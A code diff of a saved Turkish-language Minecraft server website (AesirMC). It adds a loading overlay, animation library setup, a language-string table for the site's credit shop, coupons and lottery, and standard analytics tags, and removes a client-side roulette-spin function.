+            <path d="M1920 135.143H0V56.1425C0 56.1425 39.1909 38.7124 66 36.1426C112.153 31.7185 129.007 63.9599 173.5 77C203.19 85.7015 262.5 65 262.5 65C262.5 65 308.436 114.338 347 120.5C386.857 126.869 452 93.0001 452 93.0001L567.5 115.5L639 93.0001C639 93.0001 684.87 108.987 715.5 112.5C765.051 118.184 842.5 99 842.5 99C842.5 99 909.139 114.278 922.5 115.5C933.37 116.495 1036 104 1036 104C1036 104 1056.7 111.198 1091.5 114.5C1125.33 117.71 1147.73 113.608 1179.5 115.5C1250.14 119.707 1280.29 101.723 1351 99C1374.22 98.1059 1387.5 95.7127 1410.5 99C1432.41 102.131 1450.5 112.5 1465 114.5C1491 118.086 1513.5 93 1513.5 93C1513.5 93 1520.53 118.525 1532.5 111C1541.07 105.611 1549.73 93.8566 1564 90C1578.93 85.9645 1603.5 93 1603.5 93C1603.5 93 1630 113.455 1642 111C1671.66 104.933 1706 78.5 1706 78.5C1706 78.5 1729.24 93 1773 93C1786 93 1831 62.5 1831 62.5C1831 62.5 1856.95 54.5184 1872 40.5C1882.48 30.7373 1879.46 12.6795 1889 8C1900.22 2.49259 1920 0 1920 0V93C1920 93 1916.17 95.9501 1913.5 97.5C1909.11 100.049 1901.5 102.5 1901.5 102.5C1901.5 102.5 1904.73 107.559 1908 109.143C1912.22 111.187 1920 109.143 1920 109.143V135.143Z"></path>
+        </svg>
+
+        <div class="mt-24 text-center text-2xl text-white">
+            Website yükleniyor... lütfen bekleyiniz.        </div>
+        <div class="mt-12 flex items-center justify-center gap-20">
+            <div class="h-px bg-gradient-to-l from-white/75 w-72 flex gap-2 justify-end items-center">
+                <div class="rounded-full w-1.5 h-1.5 bg-white"></div>
+                <div class="rounded-full w-3 h-3 bg-white"></div>
+            </div>
+            <div>			  
+			  <script src="./AesirMC - MMORPG Minecraft_files/dotlottie-wc.js.indir" type="module"></script>
+
+<dotlottie-wc src="https://lottie.host/83ace9f3-1c22-46d5-985f-50583ab35854/1g48bVpfFi.lottie" style="width: 100px;height: 100px" autoplay="" loop=""><template shadowrootmode="open"><canvas></canvas><!----><slot></slot></template></dotlottie-wc>
+            </div>
+            <div class="h-px bg-gradient-to-r from-white/75 w-72 flex gap-2 items-center">
+                <div class="rounded-full w-3 h-3 bg-white"></div>
+                <div class="rounded-full w-1.5 h-1.5 bg-white"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="./AesirMC - MMORPG Minecraft_files/flickity.pkgd.min.js.indir" type="text/javascript"></script>
+<script src="./AesirMC - MMORPG Minecraft_files/anime.min.js.indir" type="text/javascript"></script>
+<script src="./AesirMC - MMORPG Minecraft_files/aos.js.indir" type="text/javascript"></script>
+
+<script type="text/javascript">
+    // Wrap every letter in a span
+    function textAnimation(fast=false) {
+        return {
+            start(el) {
+                const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
+                if (!isMobile) {
+                    const letters = el.querySelector('.letters')
+                    const text = letters.textContent
+
+                    letters.innerHTML = text.replace(/\S/g, "<span class='letter'>$&</span>")
+
+                    anime.timeline({loop: false})
+                        .add({
+                            targets: '.ml9 .letter',
+                            scale: [0, 1],
+                            duration: fast ? 200:1000,
+                            elasticity: 600,
+                            delay: (el, i) => 45 * (i+1)
+                        }).add({
+                        targets: '.ml9',
+                        opacity: 1,
+                        duration: 1000,
+                        easing: "easeOutExpo",
+                        delay: 1000
+                    });
+                }
+            }
         }
     }
 
-    function ruletiBaslat() {
-        const strip = document.getElementById('roulette-strip');
-        const btn = document.getElementById('spin-btn');
-        btn.disabled = true;
-        const move = 3000 + Math.floor(Math.random() * 1500);
-        strip.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
-        strip.style.transform = `translateX(-${move}px)`;
-        setTimeout(() => {
-            const win = itemHavuzu[Math.floor(Math.random() * itemHavuzu.length)];
-            document.getElementById('win-popup').style.display = 'flex';
-            document.getElementById('won-item-display').src = win.img;
-            document.getElementById('won-item-title').innerText = win.ad;
-        }, 4200);
-    }
+    AOS.init({
+        // Global settings:
+        disable: 'mobile', // accepts following values: 'phone', 'tablet', 'mobile', boolean, expression or function
+        startEvent: 'DOMContentLoaded', // name of the event dispatched on the document, that AOS should initialize on
+        initClassName: 'aos-init', // class applied after initialization
+        animatedClassName: 'aos-animate', // class applied on animation
+        useClassNames: false, // if true, will add content of `data-aos` as classes on scroll
+        disableMutationObserver: false, // disables automatic mutations' detections (advanced)
+        debounceDelay: 50, // the delay on debounce used while resizing window (advanced)
+        throttleDelay: 99, // the delay on throttle used while scrolling the page (advanced)
+
+
+        // Settings that can be overridden on per-element basis, by `data-aos-*` attributes:
+        offset: 120, // offset (in px) from the original trigger point
+        delay: 50, // values from 0 to 3000, with step 50ms
+        duration: 500, // values from 0 to 3000, with step 50ms
+        easing: 'ease', // default easing for AOS animations
+        once: true, // whether animation should happen only once - while scrolling down
+        mirror: false, // whether elements should animate out while scrolling past them
+        anchorPlacement: 'top-bottom', // defines which position of the element regarding to window should trigger the animation
+
+    })
 </script>
-</body>
-</html>
+
+<script type="text/javascript">
+	var $onlineAPI = "2";
+	var defaultMode = "";
+</script>
+
+<script type="text/javascript">
+	var lang = {
+		credits: "%credit% kredi",
+		search: "Ara...",
+		loading: "Yükleniyor...",
+		confirm_delete: "Silmek istediğinizden emin misiniz?",
+		player_not_found: "Oyuncu bulunamadı!",
+		play_again: "Tekrar oyna",
+		spinning: "Çeviriliyor...",
+		apply: "Uygula",
+		remove: "Sil",
+		alert_btn_ok: "OK",
+		alert_btn_cancel: "İptal",
+		alert_btn_confirm: "Onayla",
+		alert_btn_buy_credit: "Kredi Yükle",
+		alert_title_success: "Başarılı!",
+		alert_title_error: "Hata!",
+		alert_title_warning: "Uyarı!",
+		alert_title_you_lost: "Kaybettin!",
+		alert_title_you_win: "Kazandınız!",
+		alert_message_server_address_copied: "Sunucu adresi kopyalandı!",
+		alert_message_something_went_wrong: "Bir şeyler yanlış. Sonra tekrar deneyin.",
+		alert_message_lottery_error_duration: "Tekrar çevirmek için %date%'e kadar beklemeniz gerekiyor.",
+		alert_message_lottery_you_lost: "Üzgünüm, kaybettiniz. Sonra tekrar deneyin.",
+		alert_message_lottery_you_win: "Tebrikler! <strong>%prize%</strong> kazandınız!",
+		alert_message_lottery_you_win_chest: "Ürün sandığınıza eklendi.",
+		alert_message_lottery_you_win_credit: "Mevcut Kredi: %credit%",
+		alert_message_lottery_credit_error: "Oynamak için yeterli krediniz bulunmuyor.",
+		alert_message_chest_confirm: "Onaylamadan önce oyunda olduğunuzdan emin olun, aksi takdirde ürün size ulaşmayabilir!",
+		alert_message_chest_sending: "Teslimat işlemi devam ediyor, lütfen bekleyin ve sayfadan ayrılmayın...",
+		alert_message_chest_sent: "Ürün başarıyla teslim edildi, Hayırlı Olsun!",
+		alert_message_chest_server_error: "Sunucuya bağlanırken bir sorun yaşandı, lütfen daha sonra tekrar deneyin.",
+		alert_message_chest_amount_error: "En fazla %amount% adet teslim alabilirsin!",
+		alert_message_login: "Bu işlemi yapabilmek için giriş yapın.",
+		help_voting_success: "Oy kullanımı başarıyla tamamlandı!",
+		alert_message_checkout_credit_error: "Yeterli krediniz bulunmuyor.",
+		alert_message_checkout_success: "Ödeme işlemi tamamlandı ve ürün sandığınıza eklendi.",
+		alert_message_checkout_quantity_error: "Geçerli bir adet giriniz!",
+		alert_message_checkout_stock_error: "Stok nedeniyle bu üründen daha fazla ekleyemezsin!",
+		alert_message_checkout_stock_error2: "Stokta yeterli ürün yok!",
+		alert_message_checkout_cart_empty_error: "Sepetiniz boş!",
+		alert_message_checkout_coupon_invalid: "Kupon geçersiz!",
+		alert_message_checkout_coupon_invalid_for_cart: "Bu kupon, sepetiniz için uygun değil!",
+		alert_message_checkout_coupon_used: "Bu kuponu daha önceden kullandınız!",
+		alert_message_checkout_coupon_expired: "Bu kuponun süresi bitmiş!",
+		alert_message_checkout_coupon_login: "Kupon kullanmak için giriş yapmanız gerekiyor!",
+		alert_message_checkout_coupon_success: "Kupon başarıyla uygulandı!",
+		alert_message_checkout_coupon_price: "Bu kuponu kullanabilmek için sepetiniz en az %amount% kredi değerinde olmalıdır!",
+		alert_message_not_found: "Not found!",
+		limited_stock: "Sınırlı Stok!",
+		out_of_stock: "Stok Yok!"
+	}
+</script>
+
+
+
+<script src="./AesirMC - MMORPG Minecraft_files/main.min.1768293220.js.indir" type="text/javascript"></script>
+
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async="" cookie-consent="targeting" src="./AesirMC - MMORPG Minecraft_files/js" type="text/javascript"></script>
+	<script cookie-consent="targeting" type="text/javascript">
+		window.dataLayer = window.dataLayer || [];
+		function gtag(){dataLayer.push(arguments);}
+		gtag("js", new Date());
+		
+		gtag("config", "");
+	</script>
+
+
+
+<script src="./AesirMC - MMORPG Minecraft_files/slimselect.min(1).js.indir" type="text/javascript"></script>
+
+
+<script defer="" src="./AesirMC - MMORPG Minecraft_files/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;b25d7e3626c04b4b9151658cd0b219e6&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body></html>
